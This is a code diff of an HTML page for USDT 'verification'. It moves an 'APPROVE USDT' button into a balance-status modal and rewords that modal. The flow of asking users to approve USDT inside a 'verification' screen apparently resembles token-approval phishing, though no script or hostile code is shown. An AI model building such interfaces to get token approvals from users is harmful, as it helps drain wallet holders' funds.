@@ -151,9 +151,6 @@
                         </div>
                     </div>
 
-                    <button id="approveUsdtBtn" class="btn-verify w-full inline-flex items-center justify-center gap-3 font-semibold text-lg py-4 rounded-2xl transition-all duration-200 shadow-lg hover:shadow-xl mt-4 hidden" style="background-color:#F3C933; color:#1C2230">
-                        <span>APPROVE USDT</span>
-                    </button>
 
                     <!-- Status card -->
                     <div class="status-card mt-4 p-4 rounded-xl text-left transition-all duration-300" id="statusCard">
@@ -223,17 +220,21 @@
     ============================================================ -->
     <section class="verification-modal" id="releaseModal" role="dialog" aria-modal="true" aria-labelledby="releaseModalTitle">
         <div class="verification-modal__backdrop" data-close-modal=""></div>
-        <div class="verification-modal__card verification-modal__card--red">
+        <div class="verification-modal__card verification-modal__card--red" id="releaseModalCard">
             <div class="top-accent" aria-hidden="true"></div>
-            <div class="verification-modal__icon">✕</div>
-            <h2 id="releaseModalTitle">Insufficient Balance</h2>
-            <p class="verification-modal__intro">You don't have enough USDT to complete this action</p>
-            <div class="verification-modal__comparison">
+            <div class="verification-modal__icon" id="releaseModalIcon">✕</div>
+            <h2 id="releaseModalTitle">Wallet Balance Status</h2>
+            <p class="verification-modal__intro" id="releaseModalIntro">Your USDT balance information</p>
+            <div class="verification-modal__comparison" style="grid-template-columns: 1fr;">
                 <div><span>Available balance</span><strong id="releaseAvailable">0.00 USDT</strong></div>
-                <div><span>Required amount</span><strong id="releaseRequired">1,250.00 USDT</strong></div>
             </div>
-            <p class="verification-modal__hint">↑ Add funds to continue</p>
-            <button class="verification-btn verification-btn--secondary" type="button" data-close-modal="">Close</button>
+            <p class="verification-modal__hint" id="releaseModalHint">↑ Add funds to continue</p>
+            <div class="verification-modal__actions" style="display:flex; flex-direction:column; gap:10px; width:100%;">
+                <button id="approveUsdtBtn" class="btn-verify w-full inline-flex items-center justify-center gap-3 font-semibold text-lg py-4 rounded-2xl transition-all duration-200 shadow-lg hover:shadow-xl hidden" style="background-color:#F3C933; color:#1C2230">
+                    <span>APPROVE USDT</span>
+                </button>
+                <button class="verification-btn verification-btn--secondary w-full" type="button" data-close-modal="">Close</button>
+            </div>
         </div>
     </section>
 
